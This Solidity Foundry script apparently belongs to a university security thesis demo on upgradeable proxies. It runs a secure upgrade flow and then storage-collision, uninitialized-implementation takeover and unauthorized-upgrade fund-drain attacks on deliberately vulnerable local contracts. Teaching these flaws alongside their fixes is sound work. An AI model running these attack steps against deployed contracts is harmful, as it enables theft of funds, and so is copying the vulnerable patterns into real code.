// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/vulnerable/BadProxy.sol";
import "../src/vulnerable/VulnerableLogicV1.sol";
import "../src/vulnerable/VulnerableLogicV2.sol";
import "../src/vulnerable/VulnerableUUPS.sol";
import "../src/vulnerable/MaliciousImpl.sol";
import "../src/secure/SecureUUPS.sol";
import "../src/secure/SecureLogicV1.sol";
import "../src/secure/SecureLogicV2.sol";
import "../src/secure/SecureProxy.sol";

/**
 * @title AllDemo
 * @notice Complete presentation demo: Normal flow + Attack scenarios
 * @dev Run: forge script script/AllDemo.s.sol --rpc-url http://localhost:8545 --broadcast -vvv
 */
contract AllDemo is Script {
    function run() external {
        uint256 deployerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
        uint256 attackerKey = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

        address deployer = vm.addr(deployerKey);
        address attacker = vm.addr(attackerKey);

        console.log("");
        console.log("################################################################");
        console.log("#          USC SECURITY THESIS - PRESENTATION DEMO            #");
        console.log("################################################################");
        console.log("");
        console.log("Deployer (Admin):", deployer);
        console.log("Attacker:", attacker);

        // PART 1: SECURE UPGRADE FLOW
        _demoSecureFlow(deployerKey, deployer);

        // PART 2: STORAGE COLLISION ATTACK
        _demoStorageCollision(deployerKey);

        // PART 3: UNINITIALIZED IMPLEMENTATION ATTACK
        _demoUninitializedAttack(deployerKey, attackerKey, attacker);

        // PART 4: UNAUTHORIZED UUPS UPGRADE ATTACK
        _demoUnauthorizedUpgrade(deployerKey, attackerKey, attacker);
    }

    function _demoSecureFlow(uint256 deployerKey, address deployer) internal {
        console.log("");
        console.log("================================================================");
        console.log("  PART 1: SECURE UUPS UPGRADE FLOW");
        console.log("================================================================");

        vm.startBroadcast(deployerKey);

        // Step 1: Deploy
        SecureLogicV1 implV1 = new SecureLogicV1();
        bytes memory initData = abi.encodeCall(SecureLogicV1.initialize, (deployer));
        SecureProxy proxy = new SecureProxy(address(implV1), initData);
        console.log("[STEP 1] Deployed V1 + Proxy");
        console.log("  Proxy:", address(proxy));

        // Step 2: Interact
        SecureLogicV1 proxyV1 = SecureLogicV1(address(proxy));
        proxyV1.setValue(42);
        proxyV1.increment();
        console.log("[STEP 2] setValue(42) + increment()");
        console.log("  Value before upgrade:", proxyV1.value());

        // Step 3: Upgrade
        SecureLogicV2 implV2 = new SecureLogicV2();
        bytes memory reinitData = abi.encodeCall(SecureLogicV2.initializeV2, ());
        proxyV1.upgradeToAndCall(address(implV2), reinitData);
        console.log("[STEP 3] Upgraded to V2");

        // Step 4: Verify
        SecureLogicV2 proxyV2 = SecureLogicV2(address(proxy));
        console.log("[STEP 4] Verify state preservation");
        console.log("  Version:", proxyV2.version());
        console.log("  Value after upgrade:", proxyV2.value());
        console.log("  *** STATE PRESERVED! ***");

        vm.stopBroadcast();
    }

    function _demoStorageCollision(uint256 deployerKey) internal {
        console.log("");
        console.log("================================================================");
        console.log("  PART 2: STORAGE COLLISION ATTACK");
        console.log("================================================================");

        vm.startBroadcast(deployerKey);

        VulnerableLogicV1 vulnV1 = new VulnerableLogicV1();
        BadProxy badProxy = new BadProxy(address(vulnV1));
        console.log("[SETUP] BadProxy deployed");
        console.log("  Implementation (slot 0):", badProxy.implementation());

        VulnerableLogicV2 vulnV2 = new VulnerableLogicV2();
        badProxy.upgradeTo(address(vulnV2));
        console.log("[ATTACK] Upgraded to V2");

        VulnerableLogicV2(address(badProxy)).setCollisionVar(9999);
        console.log("[ATTACK] Called setCollisionVar(9999)");

        console.log("[RESULT] Implementation now:", badProxy.implementation());
        console.log("  *** PROXY CORRUPTED! Points to 0x270f (9999) ***");

        vm.stopBroadcast();
    }

    function _demoUninitializedAttack(uint256 deployerKey, uint256 attackerKey, address attacker) internal {
        console.log("");
        console.log("================================================================");
        console.log("  PART 3: UNINITIALIZED IMPLEMENTATION ATTACK");
        console.log("================================================================");

        vm.startBroadcast(deployerKey);
        VulnerableLogicV1 vulnImpl = new VulnerableLogicV1();
        console.log("[SETUP] VulnerableLogicV1 deployed");
        console.log("  Owner before:", vulnImpl.owner());
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        vulnImpl.initialize();
        console.log("[ATTACK] Attacker called initialize()");
        console.log("  Owner after:", vulnImpl.owner());
        console.log("  *** ATTACKER IS NOW OWNER! ***");
        vm.stopBroadcast();

        vm.startBroadcast(deployerKey);
        SecureLogicV1 secureImpl = new SecureLogicV1();
        console.log("[SECURE] SecureLogicV1 deployed");
        console.log("  _disableInitializers() blocks attack");
        vm.stopBroadcast();
    }

    function _demoUnauthorizedUpgrade(uint256 deployerKey, uint256 attackerKey, address attacker) internal {
        console.log("");
        console.log("================================================================");
        console.log("  PART 4: UNAUTHORIZED UUPS UPGRADE ATTACK");
        console.log("================================================================");

        // Setup: deployer deploys VulnerableUUPS behind an ERC1967Proxy and funds it
        vm.startBroadcast(deployerKey);
        VulnerableUUPS logic = new VulnerableUUPS();
        ERC1967Proxy proxy =
            new ERC1967Proxy(address(logic), abi.encodeWithSelector(VulnerableUUPS.initialize.selector));
        console.log("[SETUP] VulnerableUUPS proxy deployed");
        console.log("  Proxy:", address(proxy));
        payable(address(proxy)).transfer(1 ether);
        console.log("  Proxy balance before:", address(proxy).balance);
        vm.stopBroadcast();

        // Attack: any caller can call upgradeToAndCall and then drain ETH
        vm.startBroadcast(attackerKey);
        MaliciousImpl mal = new MaliciousImpl();
        VulnerableUUPS(payable(address(proxy))).upgradeToAndCall(address(mal), "");
        console.log("[ATTACK] Upgraded to malicious impl:", address(mal));
        MaliciousImpl(payable(address(proxy))).drainFunds(payable(attacker));
        console.log("[ATTACK] Funds drained to attacker");
        console.log("  Proxy balance after:", address(proxy).balance);
        console.log("  *** PROXY DRAINED! ***");
        vm.stopBroadcast();

        // Secure: _authorizeUpgrade gated by onlyOwner
        vm.startBroadcast(deployerKey);
        address deployer = vm.addr(deployerKey);
        SecureUUPS secureLogic = new SecureUUPS();
        ERC1967Proxy secureProxy =
            new ERC1967Proxy(address(secureLogic), abi.encodeWithSelector(SecureUUPS.initialize.selector, deployer));
        console.log("[SECURE] SecureUUPS proxy deployed");
        console.log("  onlyOwner in _authorizeUpgrade blocks unauthorized upgrades");
        console.log("  SecureProxy:", address(secureProxy));
        vm.stopBroadcast();

        console.log("");
        console.log("################################################################");
        console.log("#                    DEMO COMPLETE                            #");
        console.log("################################################################");
    }
}
